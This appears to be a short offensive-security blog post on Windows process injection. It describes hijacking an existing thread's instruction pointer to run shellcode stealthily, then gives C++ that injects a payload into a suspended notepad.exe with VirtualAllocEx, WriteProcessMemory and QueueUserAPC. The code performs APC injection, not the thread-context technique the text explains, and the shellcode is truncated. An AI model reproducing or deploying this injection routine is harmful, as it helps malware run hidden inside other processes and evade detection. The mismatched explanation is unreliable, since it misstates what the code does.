In the classic injection we create a remote thread in another process.
In the thread context injection, the shellcode we want to execute does not spawn a thread, but uses an existing thread of a process, which can be more stealthy as no new thread is being created and run our shellcode in that thread. 

The high-level steps for the thread context injection are the following:
- Get a handle to a victim process
- Get a handle to a victim thread in the process
- Sleep that thread 
- Change the EIP (Instruction pointer) of the thread so it points to our shellcode
- Resume the thread execution
The result will be that the thread continues its execution after sleeping and runs our shellcode.
The drawback of this technique is that the thread, once it executes the shellcode, does not know what to do, as we modified the EIP and it does not longer point to the original routine.
At the point of writing this blog, I wonder what happens if we modify the EIP again after our shellcode is executed... Good question.

The basic code that implements this injection is the following:

```c++
int main() {

	unsigned char payload[] = {
	  0xfc, 0x48, ...
	};

	size_t payload_size = sizeof(payload);
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	CreateProcessA("notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi); // We creaete the process in suspended state.
	HANDLE hVictimProcess = pi.hProcess;
	HANDLE hThread = pi.hThread;

	LPVOID lpShellcodeAddress = VirtualAllocEx(hVictimProcess, NULL, payload_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // We create a memory region in the suspended process
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE) lpShellcodeAddress; // Create the routine that points to the shellcode

	WriteProcessMemory(hVictimProcess, lpShellcodeAddress, payload, payload_size, NULL); // We write the shellcode in the memory region
	QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL); // Add the APC routine to the APC queue

	ResumeThread(hThread);

	return EXIT_SUCCESS;

}
```